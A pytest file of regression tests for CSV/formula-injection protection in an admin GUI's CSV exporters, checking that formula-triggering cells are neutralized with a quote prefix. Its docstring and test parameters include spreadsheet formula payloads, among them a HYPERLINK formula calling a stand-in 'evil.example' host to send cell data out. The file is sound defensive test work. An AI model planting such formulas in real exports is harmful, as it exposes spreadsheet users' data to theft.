"""Regression tests for CSV/formula injection protection in the operator
GUI's CSV exporters (admin_gui.py's Tables and Billing tabs).

Every string these exporters write ultimately traces back to something a
warehouse worker or account owner typed -- manifest SKU/description, a
worker's appeal note, an account's business name -- and self-service
signup means that can now be a complete stranger. A cell starting with
=, +, -, or @ is inert as stored data but becomes a live, executing
formula (OWASP calls this "CSV injection") the instant an operator opens
the exported file in Excel/Sheets/Numbers -- e.g.
`=HYPERLINK("http://evil/steal?"&A1)` silently turned into a clickable
exfiltration link.

These tests import admin_gui, which pulls in tkinter; skipped (like
test_admin_gui_smoke.py) if no display is available, since importing the
module executes module-level Tk-adjacent setup.
"""

import pytest

tk = pytest.importorskip("tkinter")

try:
    _probe = tk.Tk()
    _probe.destroy()
    _HAS_DISPLAY = True
except tk.TclError:
    _HAS_DISPLAY = False

pytestmark = pytest.mark.skipif(not _HAS_DISPLAY, reason="no display available for Tkinter")

import admin_gui  # noqa: E402


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("http://evil.example/steal?d="&A1,"click")',
        "+1+1",
        "-1+1",
        "@SUM(1+1)",
        "=1+1",
        "\t=1+1",  # a literal leading tab is itself a formula trigger in some spreadsheet apps
        "\r=1+1",
    ],
)
def test_formula_triggering_values_are_neutralized(payload):
    safe = admin_gui._csv_safe_cell(payload)
    assert safe.startswith("'"), f"{payload!r} was not neutralized: got {safe!r}"
    assert safe == "'" + payload


@pytest.mark.parametrize(
    "benign",
    ["WIDGET-A", "Normal description", "some-sku_123", "已发货", "", "O'Brien Logistics"],
)
def test_ordinary_values_pass_through_unchanged(benign):
    assert admin_gui._csv_safe_cell(benign) == benign


def test_non_string_values_pass_through_unchanged():
    """Row values from sqlite3.Row can be int/float/None -- .startswith()
    on a non-str would raise, so these must be returned as-is rather than
    erroring the whole export."""
    for value in (42, 3.14, None, 0, False):
        assert admin_gui._csv_safe_cell(value) == value


def test_a_quote_prefix_is_invisible_to_the_stored_value_semantics():
    """The mitigation must be reversible in intent: prefixing with a
    single quote is the standard spreadsheet convention for 'force text',
    and every common spreadsheet app strips it from the DISPLAYED cell --
    it is not a lossy transform from the reader's point of view, only
    from a literal byte-for-byte read of the raw CSV."""
    safe = admin_gui._csv_safe_cell("=EVIL()")
    assert safe[1:] == "=EVIL()"  # the original payload is fully preserved after the marker
